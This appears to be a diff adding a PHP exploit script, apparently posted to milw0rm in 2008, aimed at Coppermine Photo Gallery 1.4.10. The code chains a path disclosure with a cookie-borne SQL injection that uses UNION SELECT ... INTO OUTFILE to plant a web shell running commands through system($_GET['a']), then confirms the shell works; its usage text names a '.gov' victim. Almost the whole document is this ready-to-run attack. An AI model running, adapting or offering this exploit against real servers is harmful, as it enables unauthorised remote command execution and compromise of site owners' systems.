@@ -1,0 +1,120 @@
+<?php
+#####################################
+# Coppermine gallery SQL injection exploit
+# based on RST/GHC bugs
+# Author: bazik, icq 178377
+#####################################
+error_reporting(0);
+class cpg1410_xek {
+   public $GLOBALS = array();
+ 
+   function prepareExp($sql) {
+      $a1 = '1) UNION SELECT ' . $this->toHex($sql) . ', ' . $this->toHex('bazik') . ' LIMIT 1,1/*';
+      $b1 = 'bazik';
+      $a2 = $sql;
+      $b2 = 'bazik';
+      $arr = array($a1 => $b1, $a2 => $b2);
+      return $this->GLOBALS['prefix'] . '_albpw=' . rawurlencode(serialize($arr));
+   }
+ 
+   function toHex($str) {
+      for ($i=0; $i < strlen($str); $i++)
+         $result .= sprintf("%X", ord($str[$i]));
+      return "0x" . $result;
+   }
+ 
+   function sendQuery($out) {
+      $fp = fsockopen($this->GLOBALS['host'], 80, $errno, $errstr, 30);
+      if(!$fp)
+         die("[-] Can't connect to " . $this->GLOBALS['host'] . " ...\n\n");
+      else {
+         fwrite($fp, $out);
+         while(!feof($fp))
+            $str .= fgets($fp, 128);
+         fclose($fp);
+         return $str;
+      }
+   }
+ 
+   function getCookiePrefix() {
+      $out  = "HEAD " . $this->GLOBALS['path'] . "thumbnails.php?album=" . $this->GLOBALS['albumId'] . " HTTP/1.1\r\n";
+      $out .= "Host: " . $this->GLOBALS['host'] . "\r\n";
+      $out .= "Connection: Close\r\n\r\n";
+      preg_match_all('!Set-Cookie:.+(.+)_data=.+!Uim', $this->sendQuery($out), $result);
+      return $result[1][0];
+   }
+ 
+   function getPathToShell() {
+      $out  = "GET " . $this->GLOBALS['path'] . "/themes/sample/theme.php HTTP/1.1\r\n";
+      $out .= "Host: " . $this->GLOBALS['host'] . "\r\n";
+      $out .= "Connection: Close\r\n\r\n";
+      preg_match_all('!in\s(.+).{1}themes.{1}sample.{1}theme.php!Uim', $this->sendQuery($out), $result);
+      $str = strip_tags($result[1][0]);
+      return str_replace("\\", "/", $str);
+   }
+ 
+   function getShell() {
+      $sql = $this->GLOBALS['albumID'] . ') UNION SELECT ' . $this->toHex('<pre><?system($_GET[\'a\']);?></pre>') . ' INTO OUTFILE \'' . $this->GLOBALS['pathToShell'] . '/albums/userpics/shell.php\'/*';
+      $out  = "GET " . $this->GLOBALS['path'] . "thumbnails.php?album=" . $this->GLOBALS['albumID'] . " HTTP/1.1\r\n";
+      $out .= "Host: " . $this->GLOBALS['host'] . "\r\n";
+      $out .= "Accept-Language: ru\r\n";
+      $out .= "Cookie: " . $this->prepareExp($sql) . "\r\n";
+      $out .= "Connection: Close\r\n\r\n";
+      $this->sendQuery($out);
+   }
+ 
+   function hat() {
+      echo "\n## Coppermine SQL injection exploit\n";
+      echo "## Vulnerable: CPG 1.4.10 stable\n\n";
+      echo "## THIS IS UNPUBLISHED EXPLOIT CODE\n";
+      echo "## KEEP IT PRIVATE\n\n";
+   }
+ 
+   function foot() {
+      echo "## (c)oded by bazik\n";
+      echo "## 20/01/2008\n";
+   }
+}
+ 
+$exp = new cpg1410_xek();
+ 
+if ($argc != 4) {
+   $exp->hat();
+   echo "For example:\n\n";
+   echo "   php cpg1410_xek.php [url] [path] [albumID]\n\n";
+   echo "      [url]     = http://www.victim.gov\n";
+   echo "      [path]    = \cpg1410\\\n";
+   echo "      [albumID] = 1\n\n\n";
+   $exp->foot();
+} else {
+   $exp->hat();
+ 
+   preg_match("/^(http:\/\/)?([^\/]+)/i", $argv[1], $matches);
+   $exp->GLOBALS['host']    = $matches[2];
+   $exp->GLOBALS['path']    = $argv[2];
+   $exp->GLOBALS['albumID'] = intval($argv[3]);
+   $exp->GLOBALS['prefix']  = $exp->getCookiePrefix();
+   $exp->GLOBALS['pathToShell']  = $exp->getPathToShell();
+ 
+   if(empty($exp->GLOBALS['prefix']))
+      echo "[-] Can't get cookie prefix ...\n\n";
+   else
+      echo "[+] Cookie prefix: " . $exp->GLOBALS['prefix'] . "\n";
+ 
+   if(empty($exp->GLOBALS['pathToShell']))
+      echo "[-] Can't recognize full path ...\n\n";
+   else {
+      echo "[+] Full path: " . $exp->GLOBALS['pathToShell'] . "\n\n";
+      $exp->getShell();
+      $url = 'http://' . $exp->GLOBALS['host'] . $exp->GLOBALS['path'] . 'albums/userpics/shell.php';
+      if (file_get_contents($url))
+         echo "   Web-shell: " . $url . "\n\n";
+      else
+         echo "[-] Can't create web-shell ...\n\n";
+   }
+ 
+   $exp->foot();
+}
+?>
+
+# milw0rm.com [2008-01-21]
